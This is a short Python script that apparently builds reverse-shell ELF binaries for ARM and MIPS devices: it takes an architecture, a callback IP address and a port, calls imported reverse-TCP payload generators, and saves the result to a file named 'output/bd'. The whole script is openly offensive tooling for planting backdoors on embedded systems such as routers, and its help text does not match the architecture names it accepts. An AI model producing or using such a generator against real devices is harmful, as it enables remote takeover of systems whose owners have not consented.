#!/usr/bin/env python

import argparse
from struct import pack

from payloads.armle_reverse_tcp import armle_reverse_tcp
from payloads.mipsbe_reverse_tcp import mipsbe_reverse_tcp
from payloads.mipsle_reverse_tcp import mipsle_reverse_tcp

def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('--arch', help='Architecture: mips, mipsel, arm', required=True)
    parser.add_argument('--ip', help='IP address for reverse shell', required=True)
    parser.add_argument('--port', help='Port number for reverse shell', required=True)

    args = parser.parse_args()

    if args.arch == 'armle':
        content = armle_reverse_tcp(args.ip, args.port).generate_elf()
    elif args.arch == 'mipsle':
        content = mipsle_reverse_tcp(args.ip, args.port).generate_elf()
    elif args.arch == 'mipsbe':
        content = mipsbe_reverse_tcp(args.ip, args.port).generate_elf()
    else:
        print("Sorry, architecture is not supported")
        return

    print(("Architecture: {}\n"
           "IP: {}\n"
           "Port: {}\n"
           "-----------------").format(args.arch, args.ip, args.port))

    path = "output/bd"

    print(("Length: {}\n"
           "Saving to: {}\n").format(len(content), path))

    with open(path, 'wb+') as f:
        f.write(content)
        f.close()


if __name__ == '__main__':
    main()
